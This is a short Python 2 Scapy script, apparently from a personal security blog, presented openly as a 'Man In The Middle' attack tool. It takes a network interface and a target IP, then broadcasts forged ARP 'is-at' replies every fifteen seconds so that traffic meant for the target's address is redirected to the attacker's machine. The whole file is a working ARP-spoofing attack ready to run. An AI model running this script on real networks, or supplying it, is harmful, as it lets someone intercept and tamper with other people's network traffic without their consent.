#!/usr/bin/env python

from scapy.all import *
import time, sys

try:
	print "#################################################"
	print "##    Man In The Middle with Scapy by Skyper   ##"
	print "##           http://blog.skyplabs.net          ##"
	print "#################################################"
	
	interface = sys.argv[1]
	targetIP = sys.argv[2]
except:
	print "Usage: " + sys.argv[0] + " <Interface> <Target's IP>"
	sys.exit(1)

def mitm(interface, targetIP, interval=15):
	"""Man In The Middle attack"""

	try:
		myMAC = get_if_hwaddr(interface)
		print "[*] Starting attack ..."
		while 1:
			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=targetIP, hwsrc=myMAC))
			time.sleep(interval)
	except IOError:
		print "[!] Interface doesn't exist"
		sys.exit(1)
	except KeyboardInterrupt:
		pass
		print ""
		print "[*] Stopping attack"

mitm(interface, targetIP)
